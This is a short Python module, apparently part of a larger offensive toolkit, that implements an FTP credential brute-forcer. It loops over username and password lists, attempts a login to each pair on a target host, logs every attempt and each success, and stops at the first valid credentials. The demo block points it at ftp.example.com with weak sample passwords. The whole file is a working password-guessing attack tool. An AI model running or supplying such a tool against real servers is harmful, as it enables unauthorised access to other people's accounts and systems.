from ftplib import FTP
from core.logger import log_event

class FTPBruter:
    def __init__(self, host, usernames, passwords):
        self.host = host
        self.usernames = usernames
        self.passwords = passwords
        self.successful = []

    def try_login(self, username, password):
        try:
            ftp = FTP(self.host, timeout=5)
            ftp.login(user=username, passwd=password)
            ftp.quit()
            return True
        except:
            return False

    def run(self):
        for user in self.usernames:
            for pwd in self.passwords:
                log_event("ftp_brute_try", {"username": user, "password": pwd})
                if self.try_login(user, pwd):
                    result = {"user": user, "pass": pwd}
                    log_event("ftp_brute_success", result, level="info")
                    self.successful.append(result)
                    return self.successful
        return self.successful

if __name__ == "__main__":
    usernames = ["ftp", "test"]
    passwords = ["test123", "123456"]
    bruter = FTPBruter("ftp.example.com", usernames, passwords)
    print(bruter.run())
